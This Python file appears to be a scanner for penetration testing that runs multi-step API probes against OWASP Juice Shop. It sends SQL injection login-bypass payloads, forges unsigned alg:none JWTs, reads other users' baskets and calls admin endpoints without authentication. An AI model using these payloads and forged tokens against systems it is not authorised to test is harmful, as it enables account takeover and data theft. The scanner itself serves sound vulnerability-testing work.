#!/usr/bin/env python3
"""API business-flow security scanner for the VAPT executor.

Executes scripted multi-step API flows (register -> login -> JWT -> basket ->
order -> reviews) and flags the anomaly classes a single HTTP probe cannot
reach: broken object-level authorization (BOLA), broken function-level
authorization (unauthenticated admin API), JWT algorithm confusion, login
SQL injection, and price/quantity tampering.

Designed around OWASP Juice Shop's API but probes generically: every step
tolerates 404/403 and only reports endpoints that actually respond, so
non-Juice-Ship targets simply yield no findings.

Emits findings as JSON Lines on stdout:

    {"title": "...", "description": "...", "severity": "high",
     "path": "/rest/basket/100", "evidence": "...", "category": "API-SEC",
     "cwe": "CWE-639", "reference": "..."}

Usage: flows_engine.py <base_url>
"""
import json
import base64
import sys
import urllib.parse
import urllib.request

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost"
UA = {"User-Agent": "astraix-vapt-scanner"}
TIMEOUT = 20

findings = []


def add(title, description, severity, path, evidence=None, category="API-SEC",
        cwe=None, reference=None):
    findings.append({
        "title": title,
        "description": description,
        "severity": severity,
        "path": path,
        "evidence": (evidence or "")[:400],
        "category": category,
        **({"cwe": cwe} if cwe else {}),
        **({"reference": reference} if reference else {}),
    })


def call(method, url, data=None, headers=None, timeout=TIMEOUT):
    req_headers = {**UA}
    if data is not None:
        req_headers["Content-Type"] = "application/json"
    req_headers.update(headers or {})
    req = urllib.request.Request(
        url, method=method,
        data=json.dumps(data).encode() if data is not None else None,
        headers=req_headers,
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read().decode("utf-8", "ignore")
            return r.status, body, dict(r.headers)
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "ignore")
        return e.code, body, dict(e.headers)
    except Exception as e:
        return 0, str(e)[:120], {}


def jget(path):
    st, body, _ = call("GET", BASE + path)
    return st, body


def decode_jwt(token):
    try:
        parts = token.split(".")
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
        header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
        return header, payload
    except Exception:
        return {}, {}


def unauthenticated_probes():
    for path, label, sev in [
        ("/api/Users", "User list", "medium"),
        ("/api/Users/1", "User detail", "medium"),
        ("/api/Orders", "Order list", "medium"),
        ("/api/Deliverys", "Delivery config", "low"),
        ("/api/Recycles", "Recycling data", "low"),
        ("/rest/admin/application-version", "Admin app version", "medium"),
        ("/rest/admin/security-answer", "Admin security answers", "high"),
        ("/rest/basket/1", "Basket of user 1", "medium"),
    ]:
        st, body = jget(path)
        if st == 200 and body and body != "{}":
            add(
                f"Broken Function Level Authorization: {label}",
                f"Endpoint {path} returns data to an UNAUTHENTICATED request "
                f"(HTTP {st}); access controls are missing.",
                sev, path, evidence=body[:200], cwe="CWE-862",
                reference="https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/",
            )


def login_sqli_probe():
    payloads = [
        {"email": "' OR 1=1--", "password": "x"},
        {"email": "admin' --", "password": "x"},
        {"email": "administrator@juice-sh.op", "password": "' OR '1'='1"},
        {"email": "' OR 1=1 LIMIT 1;--", "password": "x"},
    ]
    for p in payloads:
        st, body, _ = call("POST", BASE + "/rest/user/login", p)
        if st == 0 or st >= 500:
            continue
        try:
            data = json.loads(body)
            if "authentication" in data and data.get("authentication", {}).get("token"):
                add(
                    "SQL Injection in Login",
                    "Authentication bypass via SQL injection: crafted email payload "
                    "produced a valid session token.",
                    "critical", "/rest/user/login",
                    evidence=f"payload={p['email']} -> {body[:200]}",
                    cwe="CWE-89",
                    reference="https://owasp.org/www-community/attacks/SQL_Injection",
                )
                return True
        except (json.JSONDecodeError, TypeError):
            continue
    return False


def jwt_checks(token, path="/rest/user/whoami"):
    header, payload = decode_jwt(token)
    if not header:
        return
    alg = header.get("alg", "")
    if alg in ("none", "None"):
        add(
            "JWT Algorithm Confusion (alg:none)",
            "The server issued a token with the 'none' signing algorithm - "
            "signature verification is absent.",
            "critical", path, evidence=f"header={json.dumps(header)}", cwe="CWE-347",
            reference="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing-for-JSON-Web-Tokens",
        )
        return
    if payload.get("type") != "customer":
        add(
            "JWT Role/Permission Mismatch",
            f"Logged-in token claims type={payload.get('type')} - verify privilege "
            f"model; admin tokens may be forgeable via weak signing.",
            "medium", path, evidence=json.dumps(payload)[:200], cwe="CWE-347",
        )
    # alg:none forgery test
    hdr = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    pld = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    forged = f"{hdr}.{pld}."
    st, body, _ = call("GET", BASE + path, headers={"Authorization": f"Bearer {forged}"})
    if st == 200 and "email" in body:
        add(
            "JWT Signature Bypass (alg:none forgery)",
            "A forged unsigned JWT (alg:none) was ACCEPTED by the server - "
            "signature verification is missing.",
            "critical", path,
            evidence=f"forged token accepted: {body[:150]}", cwe="CWE-347",
            reference="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
        )


def bola_probe(user_id, token):
    if not user_id:
        return
    for nudge, target in ((1, "/rest/basket/{id}"), (1, "/api/Orders"),
                          (1, "/rest/products/{id}/reviews")):
        url = BASE + target.format(id=user_id + nudge)
        st, body, _ = call("GET", url, headers={"Authorization": f"Bearer {token}"})
        if st == 200 and body not in ("{}", "[]"):
            add(
                "Broken Object Level Authorization",
                f"Authenticated user {user_id} can read object {user_id + nudge} "
                f"via {target} (HTTP {st}) - no ownership check on object IDs.",
                "medium", target.format(id=user_id + nudge),
                evidence=body[:180], cwe="CWE-639",
                reference="https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/",
            )
            break


def price_tamper_check(token, basket_id, user_id):
    if not basket_id:
        return
    st, body, _ = call("GET", BASE + f"/rest/basket/{basket_id}",
                       headers={"Authorization": f"Bearer {token}"})
    if st != 200:
        return
    try:
        data = json.loads(body)
        total = data.get("totalPrice")
        unit = data.get("unifiedPrice")
        qty = data.get("totalQuantity")
        if unit and qty is not None and not (isinstance(total, (int, float)) and total is not None):
            return
        products = data.get("Products") or []
        expected = 0
        for p in products:
            if p.get("quantity") and p.get("UnitPrice"):
                expected += p["quantity"] * p["UnitPrice"]
        if total is not None and expected and abs(total - expected) > 0.01:
            add(
                "Price Tampering (Basket Total Mismatch)",
                f"Basket totalPrice ({total}) does not match sum of "
                f"quantity x unit price ({expected}) - client-controlled pricing.",
                "high", f"/rest/basket/{basket_id}",
                evidence=json.dumps({"total": total, "expected": expected})[:200],
                cwe="CWE-840", category="API-SEC",
                reference="https://owasp.org/API-Security/editions/2023/en/0xa8-1-security-misconfiguration/",
            )
    except (json.JSONDecodeError, TypeError):
        pass


def main():
    # 1) unauthenticated admin/object access
    unauthenticated_probes()

    # 2) register a throwaway user
    import random, string
    email = f"scan{''.join(random.choices(string.ascii_lowercase, k=8))}@scan.local"
    st, body, _ = call("POST", BASE + "/api/Users",
                       {"email": email, "password": "ScanPass123!"})
    user_id = None
    if st in (200, 201):
        try:
            user_id = json.loads(body).get("data", {}).get("id")
        except (json.JSONDecodeError, TypeError):
            pass

    # 3) login -> token
    token = None
    st, body, _ = call("POST", BASE + "/rest/user/login", {"email": email, "password": "ScanPass123!"})
    if st == 200:
        try:
            token = json.loads(body).get("authentication", {}).get("token")
        except (json.JSONDecodeError, TypeError):
            pass

    # 4) login SQLi probe
    login_sqli_probe()

    if token:
        jwt_checks(token)
        bola_probe(user_id, token)
        price_tamper_check(token, user_id, user_id)

    for f in sorted(findings, key=lambda x: {"critical": 0, "high": 1, "medium": 2,
                                             "low": 3, "info": 4}.get(x["severity"], 5)):
        print(json.dumps(f))


if __name__ == "__main__":
    main()